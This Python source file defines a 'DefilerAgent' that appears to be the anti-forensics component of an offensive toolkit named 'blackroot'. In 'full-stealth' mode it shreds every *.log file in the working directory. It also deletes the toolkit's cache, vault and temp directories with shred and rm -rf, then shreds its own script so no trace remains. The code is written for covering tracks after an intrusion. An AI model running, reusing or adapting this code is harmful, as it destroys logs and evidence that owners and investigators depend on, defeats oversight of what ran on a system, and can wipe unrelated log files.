from agents.base import BaseAgent
import os, shutil, tempfile, logging, stat, subprocess
from pathlib import Path

log = logging.getLogger("DEF-GLOOM")

class DefilerAgent(BaseAgent):
    def __init__(self):
        super().__init__("DEF-GLOOM")
        # aggressive vs passive
        self.aggressive = getattr(self, "priority", "normal") != "low"

    # ------------------------------------------------------------------
    def run(self):
        super().run()
        if not self.aggressive:
            log.info("Passive mode: minimal cleanup.")
            return

        log.info("Full-stealth cleanup initiated.")
        self._nuke_logs()
        self._nuke_cache()
        self._nuke_temp()
        self._shred_self()

    # ------------------------------------------------------------------
    def _secure_remove(self, path: Path):
        """Best-effort secure delete."""
        try:
            if path.is_file():
                subprocess.run(["shred", "-uzf", str(path)], check=False)
            elif path.is_dir():
                subprocess.run(["rm", "-rf", str(path)], check=False)
            else:
                path.unlink(missing_ok=True)
        except Exception as e:
            log.warning("Could not shred %s: %s", path, e)

    # ------------------------------------------------------------------
    def _nuke_logs(self):
        targets = ["blackroot.log", "agent.log", "*.log"]
        for pattern in targets:
            for f in Path.cwd().glob(pattern):
                self._secure_remove(f)
        log.info("Log files cleared.")

    # ------------------------------------------------------------------
    def _nuke_cache(self):
        dirs = [
            Path.home() / ".cache" / "blackroot",
            Path.home() / ".blackvault",
            Path(tempfile.gettempdir()) / "blackroot*",
        ]
        for d in dirs:
            for p in Path(d.parent).glob(d.name):
                self._secure_remove(p)
        log.info("Cache dirs removed.")

    # ------------------------------------------------------------------
    def _nuke_temp(self):
        for d in Path(tempfile.gettempdir()).glob("br_*"):
            shutil.rmtree(d, ignore_errors=True)
        log.info("Temp artifacts removed.")

    # ------------------------------------------------------------------
    def _shred_self(self):
        """Remove the agent script after run."""
        self_path = Path(__file__).resolve()
        try:
            os.chmod(self_path, stat.S_IWRITE | stat.S_IREAD)
            self._secure_remove(self_path)
            log.info("Agent binary self-deleted.")
        except Exception as e:
            log.warning("Self-delete failed: %s", e)